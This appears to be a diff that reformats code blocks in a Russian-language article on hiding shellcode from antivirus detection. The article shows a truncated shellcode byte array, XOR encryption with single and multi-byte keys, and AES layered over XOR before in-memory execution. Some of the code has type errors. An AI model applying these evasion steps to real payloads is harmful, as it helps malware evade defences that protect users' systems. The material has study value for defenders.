@@ -14,7 +14,11 @@
 Ниже представлен пример инициализации нагрузки посредством его внедрения в исполняемый код на языке С++.
 
 ``` c++
-  unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"                              "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"                              .....................укороченная.версия...................                                              "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x7c"                              "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+  unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+                              "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+ .....................укороченная.версия...................
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x7c"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
 ```
 
 ### Основная часть
@@ -83,12 +87,16 @@ x86_64-w64-mingw32-g++ -static -o test.exe test.cpp
 
 Реализация в коде:
 
-```
+``` c++
 void encryptdecrypt(unsigned char* shellcode, size_t size, unsigned char key) {for (size_t i = 0; i < size; i++) {shellcode[i] ^= key;}}
 ```
 
-```
-unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };size_t shellcodeSize = sizeof(originalShellcode);unsigned char key = 0x16; // Ключ для XOR-шифрованияencryptdecrypt(originalShellcode, shellcodeSize, key);// Шифрование нагрузки...// Расшифрование нагрузки перед выполнениемencryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key);
+``` c++
+unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };size_t shellcodeSize = sizeof(originalShellcode);
+unsigned char key = 0x16; // Ключ для XOR-шифрования
+encryptdecrypt(originalShellcode, shellcodeSize, key);// Шифрование нагрузки
+...// Расшифрование нагрузки перед выполнением
+encryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key);
 ```
 
 _Здесь видно, что XOR не справился со своей задачей._
@@ -97,12 +105,20 @@ _Здесь видно, что XOR не справился со своей за�
 
 _Далее, я подумал, что можно усложнить ключ, сделав его последовательностью байт:_
 
-```
-void encryptdecrypt(unsigned char shellcode, size_t size, unsigned char key, size_t keysize) {for (size_t i = 0; i < size; i++) {shellcode[i] ^= key[i % keysize];}}
+``` c++
+void encryptdecrypt(unsigned char shellcode, size_t size, unsigned char key, size_t keysize) {
+  for (size_t i = 0; i < size; i++) {
+  shellcode[i] ^= key[i % keysize];
+}}
 ```
 
-```
-unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };size_t shellcodeSize = sizeof(originalShellcode);unsigned char key[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };size_t keysize = sizeof(key);encryptdecrypt(originalShellcode, shellcodeSize, key, keysize);...encryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key, keysize);
+``` c++
+unsigned char originalShellcode[] = { 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,...,0x89,0xda,0xff,0xd5 };
+size_t shellcodeSize = sizeof(originalShellcode);
+unsigned char key[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };
+size_t keysize = sizeof(key);
+encryptdecrypt(originalShellcode, shellcodeSize, key, keysize);
+...encryptdecrypt(static_cast<unsigned char>(execMemory), shellcodeSize, key, keysize);
 ```
 
 Это также не сработало
@@ -184,8 +200,40 @@ _Шифрование и расшифрование будет происход�
 
 Тогда я подумал, что, возможно, стоит использовать XOR поверх AES. Также мне хотелось избежать хранения "сырой" нагрузки в коде, поэтому, для удобства, я написал следующий скрипт:
 
-```
-#include <iostream>#include "windows.h"#include "AES.h"#include <iomanip>void encryptdecrypt(unsigned char shellcode, unsigned int size, unsigned char key, size_t keysize) {for (size_t i = 0; i < size; i++) {shellcode[i] ^= key[i % keysize];}}int main() {AES aes(AESKeyLength::AES_128);unsigned char shellcode[] = { 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x6d, 0x79, 0x20, 0x66, 0x72, 0x69, 0x65, 0x6e, 0x64, 0x00 };unsigned int shellcodesize = sizeof(shellcode);std::cout << "Shellcode len: " << shellcode;std::cout << shellcodesize << std::endl;unsigned char aeskey[] = { 0x23, 0x45, 0x67, 0x89,0xAB, 0xCD, 0xEF, 0x10,0x32, 0x54, 0x76, 0x98,0xBA, 0xDC, 0xFE, 0x00 };unsigned char xorkey[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };unsigned char aesshellcode = aes.EncryptECB(shellcode, shellcodesize, aeskey);std::cout << "AES ENCRYPT: ";aes.printHexArray(aesshellcode, shellcodesize);size_t keysize = sizeof(xorkey);std::cout << "\n\n";encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);std::cout << "AES + XOR ENCRYPT: ";for (int i = 0; i < shellcodesize; i++) {std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);if (i < shellcodesize - 1) {std::cout << ", ";}}std::cout << "\n\n";std::cout << "XOR DECRYPT: ";encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);for (int i = 0; i < shellcodesize; i++) {std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);if (i < shellcodesize - 1) {std::cout << ", ";}}unsigned char decaesshelcode = aes.DecryptECB(aesshellcode, shellcodesize, aeskey);std::cout << "\n\n";std::cout << "XOR + AES DECRYPT: ";aes.printHexArray(decaesshelcode, shellcodesize);}
+``` c++
+#include <iostream>
+#include "windows.h"
+#include "AES.h"
+#include <iomanip>
+
+void encryptdecrypt(unsigned char shellcode, unsigned int size, unsigned char key, size_t keysize) {
+  for (size_t i = 0; i < size; i++) {
+shellcode[i] ^= key[i % keysize];
+  }}
+int main() {
+  AES aes(AESKeyLength::AES_128);
+  unsigned char shellcode[] = { 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x6d, 0x79, 0x20, 0x66, 0x72, 0x69, 0x65, 0x6e, 0x64, 0x00 };
+  unsigned int shellcodesize = sizeof(shellcode);
+  std::cout << "Shellcode len: " << shellcode;
+  std::cout << shellcodesize << std::endl;
+  unsigned char aeskey[] = { 0x23, 0x45, 0x67, 0x89,0xAB, 0xCD, 0xEF, 0x10,0x32, 0x54, 0x76, 0x98,0xBA, 0xDC, 0xFE, 0x00 };
+  unsigned char xorkey[] = { 0x3A, 0xC7, 0x9F, 0x2D, 0x54 };
+  unsigned char aesshellcode = aes.EncryptECB(shellcode, shellcodesize, aeskey);
+  std::cout << "AES ENCRYPT: ";
+  aes.printHexArray(aesshellcode, shellcodesize);
+  size_t keysize = sizeof(xorkey);
+  std::cout << "\n\n";
+  encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);
+  std::cout << "AES + XOR ENCRYPT: ";
+  for (int i = 0; i < shellcodesize; i++) {
+    std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);
+    if (i < shellcodesize - 1) {
+      std::cout << ", ";
+        }
+  }
+    std::cout << "\n\n";
+    std::cout << "XOR DECRYPT: ";
+encryptdecrypt(aesshellcode, shellcodesize, xorkey, keysize);for (int i = 0; i < shellcodesize; i++) {std::cout <<  std::hex << std::setfill('0') << std::setw(2) << static_cast<int>(aesshellcode[i]);if (i < shellcodesize - 1) {std::cout << ", ";}}unsigned char decaesshelcode = aes.DecryptECB(aesshellcode, shellcodesize, aeskey);std::cout << "\n\n";std::cout << "XOR + AES DECRYPT: ";aes.printHexArray(decaesshelcode, shellcodesize);}
 ```
 
 Результат работы скрипта:
